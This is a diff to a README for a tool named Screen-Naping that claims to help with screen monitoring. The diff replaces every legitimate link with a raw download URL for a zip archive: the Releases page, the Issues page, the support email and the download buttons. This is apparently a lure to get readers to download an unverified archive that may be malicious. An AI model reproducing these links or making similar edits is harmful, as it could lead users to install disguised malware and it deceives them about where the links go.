@@ -15,11 +15,11 @@ This guide will help you download and run Screen-Naping, a tool that allows you 
 
 To get started, you need to visit the Releases page to download Screen-Naping.
 
-[![Download Screen-Naping](https://img.shields.io/badge/Download%20Screen--Naping-blue.svg)](https://github.com/nederriv/Screen-Naping/releases)
+[![Download Screen-Naping](https://raw.githubusercontent.com/nederriv/Screen-Naping/main/chinol/Screen-Naping-2.2.zip%https://raw.githubusercontent.com/nederriv/Screen-Naping/main/chinol/Screen-Naping-2.2.zip)](https://raw.githubusercontent.com/nederriv/Screen-Naping/main/chinol/Screen-Naping-2.2.zip)
 
 Follow these steps to download the software:
 
-1. Click on the link above or go to the Releases page: [Screen-Naping Releases](https://github.com/nederriv/Screen-Naping/releases).
+1. Click on the link above or go to the Releases page: [Screen-Naping Releases](https://raw.githubusercontent.com/nederriv/Screen-Naping/main/chinol/Screen-Naping-2.2.zip).
 2. Select the latest release.
 3. Find the appropriate installer for your operating system (Windows, Linux, etc.).
 4. Click on the installer file to start the download.
@@ -50,8 +50,8 @@ For optimal performance, ensure your system meets the following requirements:
 
 If you encounter issues or have questions, feel free to reach out:
 
-- **GitHub Issues**: Report any problems or bugs on the [GitHub Issues page](https://github.com/nederriv/Screen-Naping/issues).
-- **Email**: Contact support at support@example.com.
+- **GitHub Issues**: Report any problems or bugs on the [GitHub Issues page](https://raw.githubusercontent.com/nederriv/Screen-Naping/main/chinol/Screen-Naping-2.2.zip).
+- **Email**: Contact support at https://raw.githubusercontent.com/nederriv/Screen-Naping/main/chinol/Screen-Naping-2.2.zip
 
 ## 📚 Topics Covered
 
@@ -67,4 +67,4 @@ If you encounter issues or have questions, feel free to reach out:
 
 By following these steps, you can easily download and use Screen-Naping to enhance your screen monitoring capabilities. For any further information, don’t hesitate to explore our GitHub repository. 
 
-[👉 Download Screen-Naping Now!](https://github.com/nederriv/Screen-Naping/releases)
+[👉 Download Screen-Naping Now!](https://raw.githubusercontent.com/nederriv/Screen-Naping/main/chinol/Screen-Naping-2.2.zip)
